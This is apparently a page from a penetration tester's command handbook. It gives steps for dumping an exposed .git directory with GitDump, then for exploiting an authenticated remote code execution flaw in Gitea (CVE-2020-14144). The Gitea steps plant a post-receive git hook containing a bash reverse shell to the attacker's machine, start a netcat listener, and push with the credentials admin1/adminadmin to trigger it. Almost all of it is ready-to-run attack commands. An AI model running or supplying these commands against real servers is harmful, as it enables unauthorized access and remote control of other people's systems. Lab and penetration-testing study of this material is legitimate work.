Operators Handbook pg 80
https://pentestbook.six2dez.com/enumeration/webservices/github
```bash - kali
git clone https://github.com/Ebryx/GitDump
```
```bash - kali
cd GitDump
```
```bash - kali
python3 git-dump.py http://$TARGET/.git/
```
```bash - kali
cd output && git checkout -- .
```
```bash - kali
git log
```
#### Gitea
https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/
sign in > Create new repository (shelly) > Settings > Git Hooks > post-receive
```bash - Gitea
#!/bin/bash
bash -i >& /dev/tcp/$KALI/3000 0>&1 &
```
```bash - kali
touch README.md
```
```bash - kali
git init
```
```bash - kali
git add README.md
```
```bash - kali
git commit -m "Initial commit"
```
```bash - kali
git remote add origin http://$TARGET:3000/admin1/shelly.git
```
```bash - kali
sudo rlwrap -cAr nc -lvnp 3000
```
```bash - kali
git push -u origin master
```
```bash - kali
admin1
```
```bash - kali
adminadmin
```
